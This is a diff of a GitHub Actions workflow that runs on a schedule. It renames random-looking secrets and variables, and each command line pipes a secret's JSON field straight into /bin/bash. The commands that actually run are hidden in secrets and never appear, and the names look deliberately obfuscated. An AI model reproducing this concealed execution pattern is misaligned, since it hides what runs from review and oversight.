@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '34 1,7,13,19 * * *'
+    - cron: '4 0,6,12,18 * * *'
 jobs:
   start:
     runs-on: ubuntu-latest
@@ -11,18 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute task
         env:
-          rxcn12277: ${{ secrets.rxcn12277 }}
+          tpqgw93: ${{ secrets.tpqgw93 }}
         run: |
-          printf '%s' "$rxcn12277" | jq -r .ishje629 | /bin/bash
-          printf '%s' "$zl5170" | jq -r .yb221 | /bin/bash
-          printf '%s' "$t68" | jq -r .jr4 | /bin/bash
-          echo $f54 | jq -r .egwmh1 | /bin/bash
-          echo $q906 | jq -r .xvih48359 | /bin/bash
+          printf '%s' "$tpqgw93" | jq -r .cbja6 | /bin/bash
+          printf '%s' "$lxfq19" | jq -r .wkpb7201 | /bin/bash
+          echo $b66 | jq -r .peksb823 | /bin/bash
+          printf '%s' "$pdv1680" | jq -r .i923 | /bin/bash
+          echo $j214 | jq -r .dwdc983 | /bin/bash
+          printf '%s' "$wsjd1168" | jq -r .cotc4 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: 1UsgpZsZ
+          name: KQinEIB6
           path: "*.zip"
           retention-days: 1
